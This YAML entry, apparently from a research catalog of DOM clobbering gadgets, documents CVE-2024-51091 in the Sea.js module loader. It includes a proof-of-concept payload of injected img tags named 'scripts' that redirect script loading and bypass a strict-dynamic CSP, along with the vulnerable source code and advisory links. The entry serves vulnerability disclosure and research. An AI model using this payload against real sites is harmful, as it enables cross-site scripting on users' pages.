---
description: Sea.js is a module loader for the web. It is designed to change the way that you organize JavaScript. With Sea.js, it is pleasure to build scalable web applications.
github: seajs/seajs
gadgets:
  Latest:
    cve: CVE-2024-51091 
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - safari-browser
      - img-tag
      - src-attr
      - name-attr
      - strict-dynamic-csp
      - before-func-call
    pocs:
      - description: The [Sea.js](https://github.com/seajs/seajs) library uses the `src` attribute of the last element of `document.scripts` to load additional scripts.<br><br>*In the CVE advisory, it mentions version `≤2.2.3`, but it looks to work in the latest version (`3.0.3`).*
        code: |
          <!-- user input -->
          <img name="scripts">
          <img name="scripts" src="[current-location]/assets/xss/index.js">

          <script nonce="secret" src="https://cdnjs.cloudflare.com/ajax/libs/seajs/3.0.3/sea.js"></script>
          <script nonce="secret">
            seajs.config({
              alias: {
                "jquery": "jquery/jquery/1.10.1/jquery.js"
              }
            });
            seajs.use("index");
          </script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/seajs/seajs/blob/master/src/util-path.js#L231-L247">https://github.com/seajs/seajs/blob/master/src/util-path.js#L231-L247</a>

      ```javascript
      var doc = document
      var scripts = doc.scripts

      // Recommend to add `seajsnode` id for the `sea.js` script element
      var loaderScript = doc.getElementById("seajsnode") ||
        scripts[scripts.length - 1]

      function getScriptAbsoluteSrc(node) {
        return node.hasAttribute ? // non-IE6/7
          node.src :
          // see http://msdn.microsoft.com/en-us/library/ms536429(VS.85).aspx
          node.getAttribute("src", 4)
      }
      loaderPath = getScriptAbsoluteSrc(loaderScript)
      // When `sea.js` is inline, set loaderDir to current working directory
      loaderDir = dirname(loaderPath || cwd)
      ```
    links:
      - https://github.com/advisories/GHSA-pfr4-4397-3hg8
      - https://github.com/seajs/seajs/blob/master/src/util-path.js#L231-L247
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/seajs.md
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
---
